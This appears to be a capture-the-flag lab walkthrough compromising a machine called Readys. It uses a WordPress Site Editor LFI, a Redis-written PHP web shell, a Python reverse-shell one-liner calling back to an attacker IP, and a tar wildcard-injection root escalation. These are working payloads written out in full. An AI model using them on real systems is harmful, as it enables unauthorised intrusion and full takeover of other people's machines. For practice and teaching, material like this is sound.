First enumeration with nmap

`nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Mon Jan  2 14:49:53 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.202.166
Nmap scan report for 192.168.202.166                                                                                                                                   
Host is up (0.22s latency).                                                                                                                                            
Not shown: 65164 closed tcp ports (conn-refused), 368 filtered tcp ports (no-response)                                                                                 
PORT     STATE SERVICE                                                                                                                                                 
22/tcp   open  ssh                                                                                                                                                     
80/tcp   open  http                                                                                                                                                    
6379/tcp open  redis                                                                                                                                                   
                                                                                                                                                                       
Read data files from: /usr/bin/../share/nmap                                                                                                                           
# Nmap done at Mon Jan  2 14:51:41 2023 -- 1 IP address (1 host up) scanned in 108.56 seconds   
```

Good we have few ports open, let's use nmap default scripts to know what services are running on those ports.

```
# Nmap 7.93 scan initiated Mon Jan  2 14:53:39 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80,6379 -Pn 192.168.202.166
Nmap scan report for 192.168.202.166
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  2 14:54:15 2023 -- 1 IP address (1 host up) scanned in 35.83 seconds
```

now let's start by enumerating port 80 (http) first.

![image](https://user-images.githubusercontent.com/87468669/210389867-5ce82ff6-f173-4189-ab4d-52b9f0d1464f.png)

Nice it is running a wordpress cms, let's us wpscan to enumerate user,plugins,themes.

`wpscan --url http://192.168.108.166/ --enumerate p,t,u`

![image](https://user-images.githubusercontent.com/87468669/210390939-a6b8b368-ff77-4991-b240-4f6125ab54e0.png)

Great we got a plugin name... let's check searchsploit for exploit on that plugin `site editor`.

![image](https://user-images.githubusercontent.com/87468669/210391712-76a228b3-74b2-4ce0-ba53-ac3dbfa0f9c4.png)

Now we got an exploit, let's read it the poc. It is vuln to LFI.

```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

![image](https://user-images.githubusercontent.com/87468669/210392775-307a3bc2-aa23-48d4-a001-efe8f31dec19.png)

Great we got LFI, I checked for log files, could not read, i was able to read the redis.conf file since we've got redis port open.

```
http://192.168.108.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf
```

![image](https://user-images.githubusercontent.com/87468669/210398846-ce108cfa-a352-47f4-9781-df3d99590d29.png)
 
Was able to read the redis auth password. Now let's enumerate the redis port.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Readys]
└─$ redis-cli -h 192.168.108.166               
192.168.108.166:6379> auth Ready4Redis?
OK
192.168.108.166:6379> config set dir /dev/shm
OK
(1.19s)
192.168.108.166:6379> config set dbfilename shell.php
OK
(0.88s)
192.168.108.166:6379> set test "<?php system($_GET[cmd]); ?>"
OK
192.168.108.166:6379> save
OK
192.168.108.166:6379> 
```

logged in using the redis password found in the conf file through LFI. I uploaded the shell to the /dev/shm path since other paths was not writable. now lets check the shell.php file uploaded.

```
http://192.168.108.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/shell.php&cmd=id
```

![image](https://user-images.githubusercontent.com/87468669/210399841-50664af8-051c-4f07-bcf4-7d46fb0798a7.png)
 
 Great we got RCE, let's get a reverse shell... Ncat listener ready.
 
 ![image](https://user-images.githubusercontent.com/87468669/210399968-55af5c15-9e3d-4bb2-880f-1728bf413bad.png)

revshell payload ready

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.108",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://user-images.githubusercontent.com/87468669/210400385-2e98d14f-22cc-4373-b19e-3eef4173a1cc.png)

Boom!!! we got shell as user alice, and stabiziled the shell. Let's escalate privs.

```
alice@readys:/home$ cat /etc/crontab 
*/3 * * * * root /usr/local/bin/backup.sh
alice@readys:/home$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
alice@readys:/home$
```

Checking the crontab, i found out that user root runs /usr/local/bin/backup.sh every 3mins, checking the content of the script shows that bin tar compresses every files in the /opt/backup dir. Now let's abuse this binary. 

```
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > shell.sh
alice@readys:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
alice@readys:/var/www/html$ echo "" > --checkpoint=1
alice@readys:/var/www/html$ 
alice@readys:/var/www/html$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$
```

The binary tar is vulnurable to wildcard injection, i exploited it by creating an suid for /bin/bash.

![image](https://user-images.githubusercontent.com/87468669/210402756-b85d8f6a-d739-43be-b7cd-0fb08e2e3c29.png)

And Boom we got root!!!🤠😎
